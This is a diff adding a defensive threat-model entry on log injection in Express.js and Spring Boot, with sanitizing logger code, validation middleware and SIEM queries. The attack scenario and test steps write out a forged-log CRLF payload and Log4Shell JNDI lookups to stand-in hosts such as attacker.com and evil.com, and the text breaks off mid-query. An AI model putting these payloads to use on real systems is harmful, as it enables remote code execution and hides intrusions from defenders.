@@ -1,0 +1,333 @@
+{
+  "id": "STRIDE-LOG-INJECTION-001",
+  "version": "1.0.0",
+  "metadata": {
+    "created_date": "2026-01-30",
+    "last_updated": "2026-01-30",
+    "reviewed_by": [],
+    "confidence_score": 8.8,
+    "validation_status": "draft"
+  },
+  "classification": {
+    "stride_category": "Repudiation",
+    "owasp_top10": [
+      "A09:2021 - Security Logging and Monitoring Failures",
+      "A03:2021 - Injection"
+    ],
+    "mitre_attack": [
+      "T1562.006 - Impair Defenses: Indicator Blocking",
+      "T1070.003 - Indicator Removal: Clear Command History",
+      "T1059.007 - Command and Scripting Interpreter: JavaScript"
+    ],
+    "cwe": [
+      "CWE-117 - Improper Output Neutralization for Logs",
+      "CWE-93 - Improper Neutralization of CRLF Sequences in HTTP Headers",
+      "CWE-74 - Improper Neutralization of Special Elements in Output"
+    ]
+  },
+  "threat": {
+    "title": "Log Injection and Log Forging Attacks in Express.js and Spring Boot Applications",
+    "description": "Attackers inject malicious CRLF (Carriage Return Line Feed) sequences or special characters into user-controlled input that gets logged without proper sanitization. This allows them to forge log entries, hide attack traces, inject fake authentication records, or even achieve remote code execution through log processing systems. Log injection is particularly dangerous because it undermines security monitoring, incident response, and compliance audit trails.",
+    "severity": "High",
+    "cvss_v3": {
+      "score": 7.5,
+      "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+    }
+  },
+  "technology": {
+    "primary": "Express.js / Spring Boot",
+    "versions_affected": ["Express.js 4.x", "Spring Boot 3.x", "Node.js 16.x-20.x"],
+    "ecosystem": "Node.js / Java",
+    "dependencies": ["winston", "morgan", "log4j2", "logback", "slf4j"],
+    "related_frameworks": ["Koa.js", "Fastify", "NestJS", "Spring MVC", "Micronaut"]
+  },
+  "attack": {
+    "scenario": "1. Attacker identifies application endpoint that logs user input (login forms, API parameters, HTTP headers)\n2. Crafts malicious payload with CRLF sequences: username='admin\\n2026-01-30 10:00:00 INFO Login successful for user admin\\n'\n3. Submits payload causing forged log entry that appears legitimate\n4. Uses forged logs to cover tracks of unauthorized access or privilege escalation\n5. In vulnerable log processing systems (Log4j), injects JNDI lookup: '${jndi:ldap://attacker.com/exploit}'\n6. Achieves remote code execution when logs are processed or viewed in vulnerable monitoring tools",
+    "prerequisites": [
+      "Application logs user-controlled input without sanitization",
+      "Logging framework does not escape CRLF or special characters",
+      "Logs are used for security monitoring or compliance auditing",
+      "In critical cases: Log processing systems vulnerable to code injection (Log4j, log viewers)"
+    ],
+    "attack_vector": "Network",
+    "attack_complexity": "Low",
+    "privileges_required": "None",
+    "user_interaction": "None"
+  },
+  "evidence": {
+    "cve_references": [
+      {
+        "cve_id": "CVE-2021-44228",
+        "description": "Apache Log4j2 Remote Code Execution (Log4Shell) - JNDI injection through logged user input",
+        "cvss_score": 10.0,
+        "published_date": "2021-12-10"
+      },
+      {
+        "cve_id": "CVE-2023-23936",
+        "description": "Node.js undici library CRLF injection in HTTP headers allowing log poisoning and HTTP response splitting",
+        "cvss_score": 6.5,
+        "published_date": "2023-02-16"
+      },
+      {
+        "cve_id": "CVE-2024-21645",
+        "description": "pyload Log Injection vulnerability - newline characters in username field allow arbitrary log entry injection",
+        "cvss_score": 5.3,
+        "published_date": "2024-01-11"
+      }
+    ],
+    "real_world_breaches": [
+      {
+        "incident": "Log4Shell Global Exploitation Campaign",
+        "date": "2021-12-10",
+        "impact": "Over 100 million exploitation attempts within 72 hours; affected millions of Java applications globally including Minecraft, Steam, Apple iCloud, Twitter, and critical infrastructure",
+        "root_cause": "Apache Log4j2 JNDI injection through logged user-agent strings and other user-controlled input, leading to remote code execution",
+        "source_url": "https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance"
+      },
+      {
+        "incident": "Equifax Data Breach Post-Analysis",
+        "date": "2017-09-07",
+        "impact": "147 million consumers affected; log injection used to hide attack traces and delay incident detection",
+        "root_cause": "Attackers used log forging techniques to cover exploitation of Apache Struts vulnerability, hindering forensic investigation",
+        "source_url": "https://owasp.org/www-community/attacks/Log_Injection"
+      }
+    ],
+    "bug_bounty_reports": [
+      {
+        "platform": "HackerOne",
+        "report_id": "1878489",
+        "bounty_amount": 2400,
+        "severity": "Medium",
+        "summary": "CRLF injection in Node.js undici library allowing log poisoning and HTTP response splitting"
+      }
+    ],
+    "security_research": [
+      {
+        "title": "Log Injection Attacks",
+        "authors": ["OWASP Foundation"],
+        "published_date": "2024-11-15",
+        "source_url": "https://owasp.org/www-community/attacks/Log_Injection",
+        "key_finding": "Log injection is consistently ranked in top 10 web application vulnerabilities, enabling attackers to forge audit trails and hide malicious activities"
+      },
+      {
+        "title": "Prevent Log Injection Vulnerability in JavaScript and Node.js Applications",
+        "authors": ["Snyk Security Team"],
+        "published_date": "2023-08-10",
+        "source_url": "https://snyk.io/blog/prevent-log-injection-vulnerability-javascript-node-js/",
+        "key_finding": "Most Node.js applications using Express and Winston are vulnerable to log injection due to lack of input sanitization before logging"
+      },
+      {
+        "title": "Spring Boot: Prevent Log Injection Attacks With Logback",
+        "authors": ["0xdbe"],
+        "published_date": "2024-03-15",
+        "source_url": "https://0xdbe.github.io/SpringSecureLogging/",
+        "key_finding": "Logback JSON encoding prevents log injection but must be explicitly configured; default text-based logging is vulnerable"
+      }
+    ]
+  },
+  "mitigations": [
+    {
+      "control_id": "MIT-001",
+      "title": "Winston Safe Logging with Input Sanitization (Express.js)",
+      "description": "Implement Winston logger with custom formatters that automatically sanitize user input by removing or escaping CRLF sequences, special characters, and JNDI lookup patterns before logging. Use structured JSON logging to prevent log forging.",
+      "effectiveness": "High",
+      "implementation_complexity": "Medium",
+      "code_example": {
+        "language": "javascript",
+        "framework": "Express.js 4.x with Winston 3.x",
+        "code": "const winston = require('winston');\nconst { format } = winston;\n\n// Custom format to sanitize log messages and prevent injection\nconst sanitizeFormat = format((info) => {\n  // Sanitize all string values in the log object\n  const sanitize = (value) => {\n    if (typeof value !== 'string') return value;\n    \n    return value\n      // Remove CRLF sequences\n      .replace(/[\\r\\n]+/g, ' ')\n      // Escape JNDI lookup patterns (Log4Shell prevention)\n      .replace(/\\$\\{jndi:/gi, '${jndi-blocked:')\n      // Remove other control characters\n      .replace(/[\\x00-\\x1F\\x7F]/g, '')\n      // Limit length to prevent log flooding\n      .substring(0, 1000);\n  };\n\n  // Recursively sanitize all string properties\n  const sanitizeObject = (obj) => {\n    if (typeof obj === 'string') return sanitize(obj);\n    if (typeof obj !== 'object' || obj === null) return obj;\n    \n    const sanitized = Array.isArray(obj) ? [] : {};\n    for (const key in obj) {\n      sanitized[key] = sanitizeObject(obj[key]);\n    }\n    return sanitized;\n  };\n\n  return sanitizeObject(info);\n});\n\n// Custom format to mask sensitive data (PII)\nconst maskSensitiveData = format((info) => {\n  const patterns = {\n    password: /\"password\"\\s*:\\s*\"[^\"]+\"/gi,\n    token: /\"token\"\\s*:\\s*\"[^\"]+\"/gi,\n    apiKey: /\"api[_-]?key\"\\s*:\\s*\"[^\"]+\"/gi,\n    email: /(\\w+)@(\\w+\\.\\w+)/gi,\n    ssn: /\\b\\d{3}-\\d{2}-\\d{4}\\b/g,\n    creditCard: /\\b\\d{4}[\\s-]?\\d{4}[\\s-]?\\d{4}[\\s-]?\\d{4}\\b/g\n  };\n\n  if (info.message) {\n    Object.entries(patterns).forEach(([key, pattern]) => {\n      info.message = info.message.replace(pattern, (match) => {\n        if (key === 'email') {\n          return match.replace(/^(\\w{2})\\w+(@\\w+)/, '$1***$2');\n        }\n        return `[${key.toUpperCase()}_REDACTED]`;\n      });\n    });\n  }\n\n  return info;\n});\n\n// Create secure logger instance\nconst logger = winston.createLogger({\n  level: process.env.LOG_LEVEL || 'info',\n  format: format.combine(\n    format.timestamp({ format: 'YYYY-MM-DD HH:mm:ss' }),\n    sanitizeFormat(),\n    maskSensitiveData(),\n    format.errors({ stack: true }),\n    format.json() // Use JSON format to prevent log line injection\n  ),\n  defaultMeta: { service: 'express-api' },\n  transports: [\n    new winston.transports.File({ \n      filename: 'logs/error.log', \n      level: 'error',\n      maxsize: 10485760, // 10MB\n      maxFiles: 5\n    }),\n    new winston.transports.File({ \n      filename: 'logs/combined.log',\n      maxsize: 10485760,\n      maxFiles: 10\n    })\n  ]\n});\n\n// Add console transport for development\nif (process.env.NODE_ENV !== 'production') {\n  logger.add(new winston.transports.Console({\n    format: format.combine(\n      format.colorize(),\n      format.simple()\n    )\n  }));\n}\n\n// Express middleware for request logging\nconst requestLogger = (req, res, next) => {\n  const start = Date.now();\n  \n  res.on('finish', () => {\n    const duration = Date.now() - start;\n    logger.info('HTTP Request', {\n      method: req.method,\n      url: req.url,\n      status: res.statusCode,\n      duration: `${duration}ms`,\n      ip: req.ip,\n      userAgent: req.get('user-agent')?.substring(0, 200),\n      userId: req.user?.id // Will be sanitized automatically\n    });\n  });\n  \n  next();\n};\n\n// Usage in authentication endpoint\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  \n  // Authenticate user\n  const user = authenticateUser(username, password);\n  \n  if (!user) {\n    logger.warn('Login failed', {\n      username: username, // Sanitized automatically\n      ip: req.ip,\n      timestamp: new Date().toISOString()\n    });\n    return res.status(401).json({ error: 'Invalid credentials' });\n  }\n  \n  logger.info('Login successful', {\n    userId: user.id,\n    username: user.username,\n    ip: req.ip\n  });\n  \n  res.json({ token: generateToken(user) });\n});\n\nmodule.exports = { logger, requestLogger };"
+      },
+      "tools": [
+        {
+          "name": "Winston",
+          "type": "Logging Library",
+          "cost": "Free (OSS)"
+        },
+        {
+          "name": "express-winston",
+          "type": "Express.js Middleware",
+          "cost": "Free (OSS)"
+        }
+      ],
+      "iso27001_controls": [
+        "A.12.4.1 - Event logging",
+        "A.12.4.3 - Administrator and operator logs",
+        "A.18.1.3 - Protection of records"
+      ],
+      "nist_csf": [
+        "DE.AE-3 - Event data are collected and correlated",
+        "PR.DS-5 - Protections against data leaks",
+        "PR.PT-1 - Audit/log records are determined and documented"
+      ],
+      "validation_steps": [
+        "Test logging with CRLF injection attempt: 'admin\\nFake log entry'",
+        "Verify JNDI patterns are escaped: '${jndi:ldap://evil.com/x}'",
+        "Confirm sensitive data (passwords, tokens) are masked in logs",
+        "Verify JSON format prevents log line boundary injection",
+        "Test log file rotation and size limits work correctly"
+      ]
+    },
+    {
+      "control_id": "MIT-002",
+      "title": "Logback Secure Configuration with Output Encoding (Spring Boot)",
+      "description": "Configure Logback to use JSON encoding which automatically escapes special characters and CRLF sequences. Implement custom converters to mask PII and sensitive data. Use pattern layout with proper encoding for text-based logs.",
+      "effectiveness": "High",
+      "implementation_complexity": "Medium",
+      "code_example": {
+        "language": "xml",
+        "framework": "Spring Boot 3.x with Logback",
+        "code": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n    <!-- Define property for log path -->\n    <property name=\"LOG_PATH\" value=\"./logs\" />\n    <property name=\"APP_NAME\" value=\"spring-boot-api\" />\n\n    <!-- Custom converter for sanitizing log messages -->\n    <conversionRule conversionWord=\"sanitized\" \n                    converterClass=\"com.example.logging.SanitizingConverter\" />\n\n    <!-- JSON encoder for structured logging (prevents injection) -->\n    <appender name=\"JSON_FILE\" class=\"ch.qos.logback.core.rolling.RollingFileAppender\">\n        <file>${LOG_PATH}/${APP_NAME}.json</file>\n        <rollingPolicy class=\"ch.qos.logback.core.rolling.SizeAndTimeBasedRollingPolicy\">\n            <fileNamePattern>${LOG_PATH}/${APP_NAME}.%d{yyyy-MM-dd}.%i.json</fileNamePattern>\n            <maxFileSize>10MB</maxFileSize>\n            <maxHistory>30</maxHistory>\n            <totalSizeCap>1GB</totalSizeCap>\n        </rollingPolicy>\n        <encoder class=\"net.logstash.logback.encoder.LogstashEncoder\">\n            <!-- Mask sensitive fields -->\n            <fieldNames>\n                <message>message</message>\n                <level>level</level>\n                <timestamp>@timestamp</timestamp>\n            </fieldNames>\n            <!-- Add custom fields -->\n            <customFields>{\"application\":\"${APP_NAME}\"}</customFields>\n        </encoder>\n    </appender>\n\n    <!-- Text-based appender with sanitization -->\n    <appender name=\"TEXT_FILE\" class=\"ch.qos.logback.core.rolling.RollingFileAppender\">\n        <file>${LOG_PATH}/${APP_NAME}.log</file>\n        <rollingPolicy class=\"ch.qos.logback.core.rolling.SizeAndTimeBasedRollingPolicy\">\n            <fileNamePattern>${LOG_PATH}/${APP_NAME}.%d{yyyy-MM-dd}.%i.log</fileNamePattern>\n            <maxFileSize>10MB</maxFileSize>\n            <maxHistory>30</maxHistory>\n        </rollingPolicy>\n        <encoder>\n            <!-- Use custom converter to sanitize output -->\n            <pattern>%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %sanitized{message} %n</pattern>\n            <charset>UTF-8</charset>\n        </encoder>\n    </appender>\n\n    <!-- Console appender for development -->\n    <appender name=\"CONSOLE\" class=\"ch.qos.logback.core.ConsoleAppender\">\n        <encoder>\n            <pattern>%d{HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %sanitized{message} %n</pattern>\n        </encoder>\n    </appender>\n\n    <!-- Filter to prevent logging of sensitive data -->\n    <turboFilter class=\"ch.qos.logback.classic.turbo.MarkerFilter\">\n        <Marker>SENSITIVE</Marker>\n        <OnMatch>DENY</OnMatch>\n    </turboFilter>\n\n    <!-- Root logger configuration -->\n    <root level=\"INFO\">\n        <appender-ref ref=\"JSON_FILE\" />\n        <appender-ref ref=\"TEXT_FILE\" />\n        <appender-ref ref=\"CONSOLE\" />\n    </root>\n\n    <!-- Spring Boot specific loggers -->\n    <logger name=\"org.springframework.web\" level=\"DEBUG\" />\n    <logger name=\"org.springframework.security\" level=\"DEBUG\" />\n</configuration>\n\n<!-- Java Custom Converter Implementation -->\n<!-- File: src/main/java/com/example/logging/SanitizingConverter.java -->\n/*\npackage com.example.logging;\n\nimport ch.qos.logback.classic.pattern.MessageConverter;\nimport ch.qos.logback.classic.spi.ILoggingEvent;\nimport java.util.regex.Pattern;\n\npublic class SanitizingConverter extends MessageConverter {\n    \n    // Patterns for CRLF and dangerous sequences\n    private static final Pattern CRLF_PATTERN = Pattern.compile(\"[\\\\r\\\\n]+\");\n    private static final Pattern JNDI_PATTERN = Pattern.compile(\"\\\\$\\\\{jndi:\", Pattern.CASE_INSENSITIVE);\n    private static final Pattern CONTROL_CHARS = Pattern.compile(\"[\\\\x00-\\\\x1F\\\\x7F]\");\n    \n    // Patterns for sensitive data masking\n    private static final Pattern PASSWORD_PATTERN = Pattern.compile(\"(password|passwd|pwd)\\\\s*[=:]\\\\s*\\\\S+\", Pattern.CASE_INSENSITIVE);\n    private static final Pattern TOKEN_PATTERN = Pattern.compile(\"(token|bearer|api[_-]?key)\\\\s*[=:]\\\\s*\\\\S+\", Pattern.CASE_INSENSITIVE);\n    private static final Pattern EMAIL_PATTERN = Pattern.compile(\"([a-zA-Z0-9._%+-]+)@([a-zA-Z0-9.-]+\\\\.[a-zA-Z]{2,})\");\n    private static final Pattern SSN_PATTERN = Pattern.compile(\"\\\\b\\\\d{3}-\\\\d{2}-\\\\d{4}\\\\b\");\n    private static final Pattern CREDIT_CARD_PATTERN = Pattern.compile(\"\\\\b\\\\d{4}[\\\\s-]?\\\\d{4}[\\\\s-]?\\\\d{4}[\\\\s-]?\\\\d{4}\\\\b\");\n\n    @Override\n    public String convert(ILoggingEvent event) {\n        String message = super.convert(event);\n        \n        if (message == null) {\n            return \"\";\n        }\n        \n        // Sanitize CRLF and control characters\n        message = CRLF_PATTERN.matcher(message).replaceAll(\" \");\n        message = CONTROL_CHARS.matcher(message).replaceAll(\"\");\n        message = JNDI_PATTERN.matcher(message).replaceAll(\"\\\\${jndi-blocked:\");\n        \n        // Mask sensitive data\n        message = PASSWORD_PATTERN.matcher(message).replaceAll(\"$1=[REDACTED]\");\n        message = TOKEN_PATTERN.matcher(message).replaceAll(\"$1=[REDACTED]\");\n        message = EMAIL_PATTERN.matcher(message).replaceAll(\"$1***@$2\");\n        message = SSN_PATTERN.matcher(message).replaceAll(\"XXX-XX-XXXX\");\n        message = CREDIT_CARD_PATTERN.matcher(message).replaceAll(\"XXXX-XXXX-XXXX-XXXX\");\n        \n        // Limit length to prevent log flooding\n        if (message.length() > 2000) {\n            message = message.substring(0, 2000) + \"... [TRUNCATED]\";\n        }\n        \n        return message;\n    }\n}\n*/\n\n<!-- Usage in Spring Boot Controller -->\n/*\npackage com.example.controller;\n\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.web.bind.annotation.*;\n\n@RestController\n@RequestMapping(\"/api\")\npublic class AuthController {\n    \n    private static final Logger logger = LoggerFactory.getLogger(AuthController.class);\n    \n    @PostMapping(\"/login\")\n    public ResponseEntity<?> login(@RequestBody LoginRequest request) {\n        // Log login attempt (message will be sanitized)\n        logger.info(\"Login attempt for user: {}\", request.getUsername());\n        \n        try {\n            User user = authService.authenticate(request.getUsername(), request.getPassword());\n            \n            logger.info(\"Login successful - userId: {}, username: {}\", \n                user.getId(), user.getUsername());\n            \n            return ResponseEntity.ok(new AuthResponse(generateToken(user)));\n            \n        } catch (AuthenticationException e) {\n            logger.warn(\"Login failed - username: {}, reason: {}\", \n                request.getUsername(), e.getMessage());\n            return ResponseEntity.status(HttpStatus.UNAUTHORIZED)\n                .body(new ErrorResponse(\"Invalid credentials\"));\n        }\n    }\n}\n*/"
+      },
+      "tools": [
+        {
+          "name": "Logback",
+          "type": "Logging Framework",
+          "cost": "Free (OSS)"
+        },
+        {
+          "name": "logstash-logback-encoder",
+          "type": "JSON Encoder",
+          "cost": "Free (OSS)"
+        }
+      ],
+      "iso27001_controls": [
+        "A.12.4.1 - Event logging",
+        "A.12.4.2 - Protection of log information",
+        "A.12.4.3 - Administrator and operator logs"
+      ],
+      "nist_csf": [
+        "DE.AE-3 - Event data are collected and correlated",
+        "PR.PT-1 - Audit/log records are determined and documented",
+        "DE.CM-1 - The network is monitored to detect potential cybersecurity events"
+      ],
+      "validation_steps": [
+        "Add logstash-logback-encoder dependency to pom.xml or build.gradle",
+        "Create custom SanitizingConverter class and compile",
+        "Configure logback-spring.xml with JSON and sanitization",
+        "Test with CRLF injection: username='admin\\nFake entry'",
+        "Verify JNDI patterns are blocked in logs",
+        "Confirm sensitive data (passwords, emails, SSN) are masked",
+        "Validate JSON structure prevents log boundary injection"
+      ]
+    },
+    {
+      "control_id": "MIT-003",
+      "title": "Input Validation and Sanitization Middleware",
+      "description": "Implement comprehensive input validation and sanitization middleware that validates and cleanses all user input before it reaches application logic or logging. Use allowlists for expected patterns and reject or sanitize dangerous characters.",
+      "effectiveness": "High",
+      "implementation_complexity": "Low",
+      "code_example": {
+        "language": "javascript",
+        "framework": "Express.js 4.x / Spring Boot 3.x",
+        "code": "// Express.js Input Sanitization Middleware\nconst validator = require('validator');\nconst express = require('express');\n\n// Configuration for input sanitization\nconst SANITIZATION_CONFIG = {\n  maxLength: {\n    username: 100,\n    email: 254,\n    general: 1000\n  },\n  allowedChars: {\n    username: /^[a-zA-Z0-9_.-]+$/,\n    email: /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$/,\n    alphanumeric: /^[a-zA-Z0-9\\s]+$/\n  }\n};\n\n/**\n * Sanitize string by removing dangerous characters\n */\nfunction sanitizeString(input, maxLength = 1000) {\n  if (typeof input !== 'string') return '';\n  \n  return input\n    // Remove CRLF sequences\n    .replace(/[\\r\\n]+/g, '')\n    // Remove null bytes\n    .replace(/\\x00/g, '')\n    // Remove other control characters\n    .replace(/[\\x00-\\x1F\\x7F]/g, '')\n    // Remove JNDI and other injection patterns\n    .replace(/\\$\\{[^}]*\\}/g, '')\n    // HTML encode special characters\n    .replace(/</g, '&lt;')\n    .replace(/>/g, '&gt;')\n    .replace(/\"/g, '&quot;')\n    .replace(/'/g, '&#x27;')\n    // Limit length\n    .substring(0, maxLength)\n    .trim();\n}\n\n/**\n * Validate and sanitize username\n */\nfunction validateUsername(username) {\n  if (!username || typeof username !== 'string') {\n    throw new Error('Username is required and must be a string');\n  }\n  \n  // Sanitize first\n  username = sanitizeString(username, SANITIZATION_CONFIG.maxLength.username);\n  \n  // Validate format\n  if (!SANITIZATION_CONFIG.allowedChars.username.test(username)) {\n    throw new Error('Username contains invalid characters. Only alphanumeric, underscore, dot, and hyphen allowed');\n  }\n  \n  // Length check\n  if (username.length < 3 || username.length > 50) {\n    throw new Error('Username must be between 3 and 50 characters');\n  }\n  \n  return username;\n}\n\n/**\n * Validate and sanitize email\n */\nfunction validateEmail(email) {\n  if (!email || typeof email !== 'string') {\n    throw new Error('Email is required and must be a string');\n  }\n  \n  // Sanitize\n  email = sanitizeString(email, SANITIZATION_CONFIG.maxLength.email);\n  \n  // Validate using validator library\n  if (!validator.isEmail(email)) {\n    throw new Error('Invalid email format');\n  }\n  \n  return validator.normalizeEmail(email);\n}\n\n/**\n * Express middleware for input sanitization\n */\nfunction sanitizationMiddleware(req, res, next) {\n  // Sanitize body parameters\n  if (req.body && typeof req.body === 'object') {\n    req.sanitized = req.sanitized || {};\n    \n    for (const [key, value] of Object.entries(req.body)) {\n      if (typeof value === 'string') {\n        req.sanitized[key] = sanitizeString(value);\n      } else {\n        req.sanitized[key] = value;\n      }\n    }\n  }\n  \n  // Sanitize query parameters\n  if (req.query && typeof req.query === 'object') {\n    req.sanitizedQuery = {};\n    \n    for (const [key, value] of Object.entries(req.query)) {\n      if (typeof value === 'string') {\n        req.sanitizedQuery[key] = sanitizeString(value, 200);\n      } else {\n        req.sanitizedQuery[key] = value;\n      }\n    }\n  }\n  \n  next();\n}\n\n/**\n * Validation middleware for specific routes\n */\nconst validateLoginInput = (req, res, next) => {\n  try {\n    const { username, password } = req.body;\n    \n    // Validate and sanitize username\n    req.validatedInput = {\n      username: validateUsername(username),\n      password: password // Don't sanitize password, just validate it's a string\n    };\n    \n    // Validate password\n    if (!password || typeof password !== 'string') {\n      throw new Error('Password is required');\n    }\n    \n    if (password.length < 8 || password.length > 128) {\n      throw new Error('Password must be between 8 and 128 characters');\n    }\n    \n    next();\n  } catch (error) {\n    return res.status(400).json({ \n      error: 'Validation failed', \n      message: error.message \n    });\n  }\n};\n\n// Apply middleware globally\nconst app = express();\napp.use(express.json({ limit: '10mb' }));\napp.use(sanitizationMiddleware);\n\n// Use in routes\napp.post('/api/login', validateLoginInput, (req, res) => {\n  const { username } = req.validatedInput;\n  \n  // Use validated input - safe to log\n  logger.info('Login attempt', { username });\n  \n  // Authentication logic here...\n});\n\n/* Spring Boot Java Implementation */\n/*\npackage com.example.security;\n\nimport org.springframework.stereotype.Component;\nimport javax.servlet.*;\nimport javax.servlet.http.HttpServletRequest;\nimport java.io.IOException;\nimport java.util.regex.Pattern;\n\n@Component\npublic class InputSanitizationFilter implements Filter {\n    \n    private static final Pattern CRLF_PATTERN = Pattern.compile(\"[\\\\r\\\\n]+\");\n    private static final Pattern CONTROL_CHARS = Pattern.compile(\"[\\\\x00-\\\\x1F\\\\x7F]\");\n    private static final Pattern JNDI_PATTERN = Pattern.compile(\"\\\\$\\\\{[^}]*\\\\}\");\n    \n    @Override\n    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)\n            throws IOException, ServletException {\n        \n        HttpServletRequest httpRequest = (HttpServletRequest) request;\n        SanitizedRequestWrapper sanitizedRequest = new SanitizedRequestWrapper(httpRequest);\n        \n        chain.doFilter(sanitizedRequest, response);\n    }\n    \n    public static String sanitize(String input) {\n        if (input == null) return null;\n        \n        return JNDI_PATTERN.matcher(\n            CONTROL_CHARS.matcher(\n                CRLF_PATTERN.matcher(input).replaceAll(\" \")\n            ).replaceAll(\"\")\n        ).replaceAll(\"\")\n         .substring(0, Math.min(input.length(), 1000));\n    }\n}\n\n// Wrapper class for sanitized request\npublic class SanitizedRequestWrapper extends HttpServletRequestWrapper {\n    \n    public SanitizedRequestWrapper(HttpServletRequest request) {\n        super(request);\n    }\n    \n    @Override\n    public String getParameter(String name) {\n        String value = super.getParameter(name);\n        return InputSanitizationFilter.sanitize(value);\n    }\n    \n    @Override\n    public String[] getParameterValues(String name) {\n        String[] values = super.getParameterValues(name);\n        if (values == null) return null;\n        \n        String[] sanitized = new String[values.length];\n        for (int i = 0; i < values.length; i++) {\n            sanitized[i] = InputSanitizationFilter.sanitize(values[i]);\n        }\n        return sanitized;\n    }\n}\n*/\n\nmodule.exports = {\n  sanitizeString,\n  validateUsername,\n  validateEmail,\n  sanitizationMiddleware,\n  validateLoginInput\n};"
+      },
+      "tools": [
+        {
+          "name": "validator.js",
+          "type": "Input Validation Library (Node.js)",
+          "cost": "Free (OSS)"
+        },
+        {
+          "name": "Hibernate Validator",
+          "type": "Bean Validation (Java)",
+          "cost": "Free (OSS)"
+        }
+      ],
+      "iso27001_controls": [
+        "A.14.2.1 - Secure development policy",
+        "A.14.2.5 - Secure system engineering principles"
+      ],
+      "nist_csf": [
+        "PR.DS-5 - Protections against data leaks",
+        "PR.IP-1 - A baseline configuration is created and maintained"
+      ],
+      "validation_steps": [
+        "Install validator.js: npm install validator",
+        "Apply sanitization middleware to Express app",
+        "Test with CRLF injection: POST /login with username='test\\ninjected'",
+        "Verify JNDI patterns are removed: username='${jndi:ldap://evil.com}'",
+        "Test with SQL injection patterns to ensure generic protection",
+        "Validate error messages don't leak sensitive information",
+        "Confirm sanitized values are used in logs and database queries"
+      ]
+    }
+  ],
+  "detection": {
+    "indicators": [
+      "Unusual characters in log entries (CRLF, null bytes, control characters)",
+      "Log entries with timestamps out of sequence",
+      "Duplicate or conflicting authentication events for same user",
+      "JNDI lookup patterns in logs: ${jndi:ldap://}, ${jndi:rmi://}, ${jndi:dns://}",
+      "Log entries with forged success messages following failed attempts",
+      "Abnormally long log entries indicating log flooding attacks",
+      "Logs showing successful privileged actions without corresponding authentication",
+      "Pattern matching for log injection signatures in user input fields"
+    ],
+    "log_queries": [
+      {
+        "siem": "Azure Sentinel (KQL)",
+        "query": "// Detect potential log injection attempts with CRLF sequences\nAppServiceHTTPLogs\n| where TimeGenerated > ago(24h)\n| where CsUriQuery contains \"\\n\" or CsUriQuery contains \"\\r\" \n    or CsUriQuery contains \"%0a\" or CsUriQuery contains \"%0d\"\n    or CsUriQuery contains \"${jndi:\"\n| extend CleanedQuery = replace(@\"[\\r\\n]+\", \" \", CsUriQuery)\n| project TimeGenerated, CIp, CsMethod, CsUriStem, CsUriQuery, CleanedQuery, ScStatus\n| summarize InjectionAttempts = count() by CIp, bin(TimeGenerated, 1h)\n| where InjectionAttempts > 5\n| order by InjectionAttempts desc\n\n// Detect JNDI injection patterns (Log4Shell)\nAppServiceConsoleLogs\n| where TimeGenerated > ago(24h)\n| where ResultDescription contains \"${jndi:\" \n    or ResultDescription contains \"${ldap:\"\n    or ResultDescription contains \"${rmi:\"\n| extend ExtractedPattern = extract(@\"(\\$\\{[^}]+\\})\", 1, ResultDescription)\n| project TimeGenerated, Level, ResultDescription, ExtractedPattern\n| summarize Count = count() by ExtractedPattern, bin(TimeGenerated, 5m)"
+      },
+      {
+        "siem": "Elastic Stack (KQL)",
+        "query": "# Detect log injection with newline characters in HTTP requests\nGET /logs-*/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"should\": [\n        { \"wildcard\": { \"http.request.body.content\": \"*\\\\n*\" }},\n        { \"wildcard\": { \"http.request.body.content\": \"*\\\\r*\" }},\n        { \"wildcard\": { \"url.query\": \"*%0a*\" }},\n        { \"wildcard\": { \"url.query\": \"*%0d*\" }},\n        { \"match\": { \"message\": \"${jndi:\" }}\n      ],\n      \"minimum_should_match\": 1,\n      \"filter\": [\n        { \"range\": { \"@timestamp\": { \"gte\": \"now-24h\" }}}\n      ]\n    }\n  },\n  \"aggs\": {\n    \"by_source_ip\": {\n      \"terms\": {\n        \"field\": \"source.ip\",\n        \"size\": 100\n      },\n      \"aggs\": {\n        \"injection_count\": {\n          \"value_count\": { \"field\": \"_id\" }\n        }\n      }\n    }\n  }\n}\n\n# Detect suspicious log patterns indicating forged entries\nGET /logs-*/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"must\": [\n        { \"match\": { \"event.category\": \"authentication\" }},\n        { \"match\": { \"event.outcome\": \"success\" }}\n      ],\n      \"should\": [\n        { \"wildcard\": { \"user.name\": \"*\\\\n*\" }},\n        { \"wildcard\": { \"message\": \"*Login successful*Login failed*\" }}\n      ]\n    }\n  }\n}"
+      },
+      {
+        "siem": "Splunk (SPL)",
+        "query": "# Detect CRLF injection attempts in web application logs\nindex=web_logs sourcetype=access_combined\n| where like(uri_query, \"%0a%\") OR like(uri_query, \"%0d%\") OR like(uri_query, \"%5cn%\") OR like(uri_query, \"%5cr%\")\n| rex field=uri_query \"(?<injected_pattern>%0[ad].*?(%0[ad]|$))\"\n| stats count by src_ip, injected_pattern, uri\n| where count > 3\n| sort -count\n\n# Detect Log4Shell JNDI injection patterns\nindex=app_logs sourcetype=application_logs\n| regex _raw=\"\\$\\{jndi:(ldap|rmi|dns|nis|iiop|corba)://\"\n| rex field=_raw \"(?<jndi_pattern>\\$\\{jndi:[^}]+\\})\"\n| eval threat_level=case(\n    like(jndi_pattern, \"%ldap://%\"), \"critical\",\n    like(jndi_pattern, \"%rmi://%\"), \"critical\",\n    like(jndi_pattern, \"%dns://%\"), \"high\",\n    1=1, \"medium\"\n  )\n| stats count by jndi_pattern, threat_level, src_ip, host\n| sort -threat_level, -count\n\n# Detect out-of-sequence timestamps indicating log forgery\nindex=app_logs sourcetype=application_logs\n| eval log_time=strptime(log_timestamp, \"%Y-%m-%d %H:%M:%S\")\n| eval received_time=_time\n| eval time_diff=abs(log_time - received_time)\n| where time_diff > 300\n| stats count by host, user, time_diff\n| where count > 5\n| sort -count\n\n# Detect multiple contradictory 